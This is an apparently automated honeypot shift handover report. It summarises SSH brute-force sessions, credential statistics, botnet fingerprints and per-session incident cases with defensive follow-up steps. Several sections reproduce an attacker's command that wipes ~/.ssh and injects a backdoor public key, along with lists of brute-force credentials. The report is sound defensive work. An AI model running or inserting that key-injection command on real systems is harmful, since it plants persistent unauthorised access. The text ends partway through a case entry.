# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-20 |
| **Generated At** | 2026-10-20T02:31:58Z |
| **Shift Time** | 02:31 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **44** |
| Confirmed Threats | **42** |
| False Positives Filtered | **2** (4.5%) |
| Unique Attacker IPs | **30** |
| Countries of Origin | **15** |
| High Severity Cases | **31** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **13** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **145** |
| Unique Credential Pairs | **94** |
| Unique Usernames | **26** |
| Unique Passwords | **78** |
| Successful Auth Pairs | **145** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 82 |
| `345gs5662d34` | 12 |
| `ubuntu` | 11 |
| `admin` | 3 |
| `test` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `Lt111111` | 14 |
| `345gs5662d34` | 12 |
| `3245gs5662d34` | 12 |
| `support` | 3 |
| `c` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 12 |
| `root` | `3245gs5662d34` | 3 |
| `root` | `c` | 2 |
| `root` | `d` | 2 |
| `test` | `Lt111111` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `b` | `103.211.76.8` | 2026-10-20T00:00:16 |
| `root` | `c` | `10.0.0.73` | 2026-10-20T00:00:58 |
| `root` | `c` | `103.211.76.8` | 2026-10-20T00:02:02 |
| `root` | `d` | `10.0.0.73` | 2026-10-20T00:02:44 |
| `ubuntu` | `P@s$w0rd` | `217.60.255.130` | 2026-10-20T00:03:25 |
| `root` | `Behzad123` | `217.60.255.130` | 2026-10-20T00:03:29 |
| `root` | `d` | `103.211.76.8` | 2026-10-20T00:03:47 |
| `test` | `Lt111111` | `168.144.63.226` | 2026-10-20T00:04:05 |
| `root` | `e` | `10.0.0.73` | 2026-10-20T00:04:28 |
| `test` | `Lt111111` | `10.0.0.73` | 2026-10-20T00:04:28 |
| `root` | `e` | `103.211.76.8` | 2026-10-20T00:05:31 |
| `test1` | `Lt111111` | `168.144.63.226` | 2026-10-20T00:05:47 |
| `test1` | `Lt111111` | `10.0.0.73` | 2026-10-20T00:06:10 |
| `root` | `f` | `10.0.0.73` | 2026-10-20T00:06:12 |
| `root` | `f` | `103.211.76.8` | 2026-10-20T00:07:14 |
| `ubuntu` | `Lt111111` | `168.144.63.226` | 2026-10-20T00:07:28 |
| `ubuntu` | `Lt111111` | `10.0.0.73` | 2026-10-20T00:07:51 |
| `root` | `g` | `10.0.0.73` | 2026-10-20T00:07:54 |
| `root` | `------fuck------` | `10.0.0.73` | 2026-10-20T00:08:49 |
| `root` | `g` | `103.211.76.8` | 2026-10-20T00:08:55 |
_… 125 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **44** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 29 |
| Go SSH scanner | 2 |
| OpenSSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 26 | 14 |
| `98ddc5604ef6...` | Modern SSH client | 2 | 2 |
| `419da4c91ddb...` | Modern SSH client | 1 | 1 |
| `bc9e7273cde2...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 26 | 14 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 2 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `419da4c91ddb...` | libssh | 1 | 1 | Modern SSH client |
| `bc9e7273cde2...` | OpenSSH | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 12 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `172.191.132.202`, `112.220.250.20`, `157.173.125.24`, `43.128.67.6`, `164.52.105.37`, `157.230.242.116`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **30** |
| Unique ASNs | **21** |
| High-Risk ASNs | **20** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 6 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS25369` | Hydra Communications Ltd | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS28573` | Claro NXT Telecomunicacoes Ltda | 1 | HIGH |
| `AS3786` | LG DACOM Corporation | 1 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (31)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4a739470447a

| Field | Detail |
|---|---|
| **Source IP** | `103.211.76[.]8` |
| **First Seen** | 2026-10-20 00:00 |
| **Last Seen** | 2026-10-20 00:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:00:15` | `cowrie.session.connect` |
| `2026-10-20 00:00:15` | `cowrie.client.version` |
| `2026-10-20 00:00:15` | `cowrie.client.kex` |
| `2026-10-20 00:00:16` | `cowrie.login.success` |
| `2026-10-20 00:00:17` | `cowrie.session.params` |
| `2026-10-20 00:00:17` | `cowrie.command.input` |
| `2026-10-20 00:00:17` | `cowrie.log.closed` |
| `2026-10-20 00:00:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.211.76[.]8` to AbuseIPDB if not already reported
- [ ] Block `103.211.76[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf597e56f42b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-10-20 00:03 |
| **Last Seen** | 2026-10-20 00:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:03:24` | `cowrie.session.connect` |
| `2026-10-20 00:03:24` | `cowrie.client.version` |
| `2026-10-20 00:03:24` | `cowrie.client.kex` |
| `2026-10-20 00:03:25` | `cowrie.login.success` |
| `2026-10-20 00:03:25` | `cowrie.direct-tcpip.request` |
| `2026-10-20 00:03:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-10-20 00:03:25` | `cowrie.direct-tcpip.data` |
| `2026-10-20 00:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e93001949acd

| Field | Detail |
|---|---|
| **Source IP** | `168.144.63[.]226` |
| **First Seen** | 2026-10-20 00:04 |
| **Last Seen** | 2026-10-20 00:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:04:05` | `cowrie.session.connect` |
| `2026-10-20 00:04:05` | `cowrie.client.version` |
| `2026-10-20 00:04:05` | `cowrie.client.kex` |
| `2026-10-20 00:04:05` | `cowrie.login.success` |
| `2026-10-20 00:04:05` | `cowrie.session.params` |
| `2026-10-20 00:04:05` | `cowrie.command.input` |
| `2026-10-20 00:04:05` | `cowrie.log.closed` |
| `2026-10-20 00:04:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.144.63[.]226` to AbuseIPDB if not already reported
- [ ] Block `168.144.63[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57e252e8eb23

| Field | Detail |
|---|---|
| **Source IP** | `103.154.77[.]48` |
| **First Seen** | 2026-10-20 00:09 |
| **Last Seen** | 2026-10-20 00:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:09:20` | `cowrie.session.connect` |
| `2026-10-20 00:09:20` | `cowrie.client.version` |
| `2026-10-20 00:09:20` | `cowrie.client.kex` |
| `2026-10-20 00:09:22` | `cowrie.login.success` |
| `2026-10-20 00:09:22` | `cowrie.session.params` |
| `2026-10-20 00:09:22` | `cowrie.command.input` |
| `2026-10-20 00:09:22` | `cowrie.command.failed` |
| `2026-10-20 00:09:23` | `cowrie.log.closed` |
| `2026-10-20 00:09:24` | `cowrie.session.params` |
| `2026-10-20 00:09:24` | `cowrie.command.input` |
| `2026-10-20 00:09:24` | `cowrie.session.file_download` |
| `2026-10-20 00:09:24` | `cowrie.log.closed` |
| `2026-10-20 00:09:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.77[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.154.77[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-553b61a5dd34

| Field | Detail |
|---|---|
| **Source IP** | `103.154.77[.]48` |
| **First Seen** | 2026-10-20 00:09 |
| **Last Seen** | 2026-10-20 00:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:09:24` | `cowrie.session.connect` |
| `2026-10-20 00:09:24` | `cowrie.client.version` |
| `2026-10-20 00:09:25` | `cowrie.client.kex` |
| `2026-10-20 00:09:26` | `cowrie.login.success` |
| `2026-10-20 00:09:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.77[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.154.77[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dc7809c0d6e

| Field | Detail |
|---|---|
| **Source IP** | `112.220.250[.]20` |
| **First Seen** | 2026-10-20 00:12 |
| **Last Seen** | 2026-10-20 00:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:12:44` | `cowrie.session.connect` |
| `2026-10-20 00:12:44` | `cowrie.client.version` |
| `2026-10-20 00:12:45` | `cowrie.client.kex` |
| `2026-10-20 00:12:45` | `cowrie.login.success` |
| `2026-10-20 00:12:46` | `cowrie.session.params` |
| `2026-10-20 00:12:46` | `cowrie.command.input` |
| `2026-10-20 00:12:46` | `cowrie.command.failed` |
| `2026-10-20 00:12:47` | `cowrie.log.closed` |
| `2026-10-20 00:12:47` | `cowrie.session.params` |
| `2026-10-20 00:12:47` | `cowrie.command.input` |
| `2026-10-20 00:12:48` | `cowrie.session.file_download` |
| `2026-10-20 00:12:48` | `cowrie.log.closed` |
| `2026-10-20 00:12:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.220.250[.]20` to AbuseIPDB if not already reported
- [ ] Block `112.220.250[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64aab9990bc6

| Field | Detail |
|---|---|
| **Source IP** | `112.220.250[.]20` |
| **First Seen** | 2026-10-20 00:12 |
| **Last Seen** | 2026-10-20 00:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:12:48` | `cowrie.session.connect` |
| `2026-10-20 00:12:48` | `cowrie.client.version` |
| `2026-10-20 00:12:48` | `cowrie.client.kex` |
| `2026-10-20 00:12:49` | `cowrie.login.success` |
| `2026-10-20 00:12:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.220.250[.]20` to AbuseIPDB if not already reported
- [ ] Block `112.220.250[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57e9c44fcf7a

| Field | Detail |
|---|---|
| **Source IP** | `157.230.242[.]116` |
| **First Seen** | 2026-10-20 00:13 |
| **Last Seen** | 2026-10-20 00:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:13:08` | `cowrie.session.connect` |
| `2026-10-20 00:13:08` | `cowrie.client.version` |
| `2026-10-20 00:13:08` | `cowrie.client.kex` |
| `2026-10-20 00:13:09` | `cowrie.login.success` |
| `2026-10-20 00:13:10` | `cowrie.session.params` |
| `2026-10-20 00:13:10` | `cowrie.command.input` |
| `2026-10-20 00:13:10` | `cowrie.command.failed` |
| `2026-10-20 00:13:11` | `cowrie.log.closed` |
| `2026-10-20 00:13:12` | `cowrie.session.params` |
| `2026-10-20 00:13:12` | `cowrie.command.input` |
| `2026-10-20 00:13:12` | `cowrie.session.file_download` |
| `2026-10-20 00:13:12` | `cowrie.log.closed` |
| `2026-10-20 00:13:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.230.242[.]116` to AbuseIPDB if not already reported
- [ ] Block `157.230.242[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97d4ac86e69b

| Field | Detail |
|---|---|
| **Source IP** | `157.230.242[.]116` |
| **First Seen** | 2026-10-20 00:13 |
| **Last Seen** | 2026-10-20 00:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:13:12` | `cowrie.session.connect` |
| `2026-10-20 00:13:12` | `cowrie.client.version` |
| `2026-10-20 00:13:13` | `cowrie.client.kex` |
| `2026-10-20 00:13:14` | `cowrie.login.success` |
| `2026-10-20 00:13:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.230.242[.]116` to AbuseIPDB if not already reported
- [ ] Block `157.230.242[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c825b1024128

| Field | Detail |
|---|---|
| **Source IP** | `101.126.69[.]201` |
| **First Seen** | 2026-10-20 00:13 |
| **Last Seen** | 2026-10-20 00:18 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:13:30` | `cowrie.session.connect` |
| `2026-10-20 00:13:30` | `cowrie.client.version` |
| `2026-10-20 00:13:30` | `cowrie.client.kex` |
| `2026-10-20 00:13:31` | `cowrie.login.success` |
| `2026-10-20 00:13:32` | `cowrie.session.params` |
| `2026-10-20 00:13:32` | `cowrie.command.input` |
| `2026-10-20 00:13:32` | `cowrie.command.failed` |
| `2026-10-20 00:13:32` | `cowrie.log.closed` |
| `2026-10-20 00:18:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.69[.]201` to AbuseIPDB if not already reported
- [ ] Block `101.126.69[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1075e5e9a8d

| Field | Detail |
|---|---|
| **Source IP** | `103.189.235[.]141` |
| **First Seen** | 2026-10-20 00:14 |
| **Last Seen** | 2026-10-20 00:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:14:33` | `cowrie.session.connect` |
| `2026-10-20 00:14:33` | `cowrie.client.version` |
| `2026-10-20 00:14:33` | `cowrie.client.kex` |
| `2026-10-20 00:14:34` | `cowrie.login.success` |
| `2026-10-20 00:14:36` | `cowrie.session.params` |
| `2026-10-20 00:14:36` | `cowrie.command.input` |
| `2026-10-20 00:14:36` | `cowrie.command.failed` |
| `2026-10-20 00:14:36` | `cowrie.log.closed` |
| `2026-10-20 00:14:37` | `cowrie.session.params` |
| `2026-10-20 00:14:37` | `cowrie.command.input` |
| `2026-10-20 00:14:37` | `cowrie.session.file_download` |
| `2026-10-20 00:14:37` | `cowrie.log.closed` |
| `2026-10-20 00:14:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.235[.]141` to AbuseIPDB if not already reported
- [ ] Block `103.189.235[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f99df5f4cbd

| Field | Detail |
|---|---|
| **Source IP** | `103.189.235[.]141` |
| **First Seen** | 2026-10-20 00:14 |
| **Last Seen** | 2026-10-20 00:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:14:37` | `cowrie.session.connect` |
| `2026-10-20 00:14:37` | `cowrie.client.version` |
| `2026-10-20 00:14:38` | `cowrie.client.kex` |
| `2026-10-20 00:14:39` | `cowrie.login.success` |
| `2026-10-20 00:14:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.235[.]141` to AbuseIPDB if not already reported
- [ ] Block `103.189.235[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ebe6e0e67d3

| Field | Detail |
|---|---|
| **Source IP** | `43.128.67[.]6` |
| **First Seen** | 2026-10-20 00:15 |
| **Last Seen** | 2026-10-20 00:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:15:06` | `cowrie.session.connect` |
| `2026-10-20 00:15:06` | `cowrie.client.version` |
| `2026-10-20 00:15:06` | `cowrie.client.kex` |
| `2026-10-20 00:15:07` | `cowrie.login.success` |
| `2026-10-20 00:15:08` | `cowrie.session.params` |
| `2026-10-20 00:15:08` | `cowrie.command.input` |
| `2026-10-20 00:15:08` | `cowrie.command.failed` |
| `2026-10-20 00:15:09` | `cowrie.log.closed` |
| `2026-10-20 00:15:10` | `cowrie.session.params` |
| `2026-10-20 00:15:10` | `cowrie.command.input` |
| `2026-10-20 00:15:10` | `cowrie.session.file_download` |
| `2026-10-20 00:15:10` | `cowrie.log.closed` |
| `2026-10-20 00:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.67[.]6` to AbuseIPDB if not already reported
- [ ] Block `43.128.67[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-353bc73cce09

| Field | Detail |
|---|---|
| **Source IP** | `43.128.67[.]6` |
| **First Seen** | 2026-10-20 00:15 |
| **Last Seen** | 2026-10-20 00:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 00:15:10` | `cowrie.session.connect` |
| `2026-10-20 00:15:10` | `cowrie.client.version` |
| `2026-10-20 00:15:10` | `cowrie.client.kex` |
| `2026-10-20 00:15:11` | `cowrie.login.success` |
| `2026-10-20 00:15:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.67[.]6` to AbuseIPDB if not already reported
- [ ] Block `43.128.67[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e190f88adfc7

| Field | Detail |
|---|---|
| **Source IP** | `164.52.105[.]37` |
| **First Seen** | 2026-10-20 00:15 |
| **Last Seen** | 2026-10-20 00:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
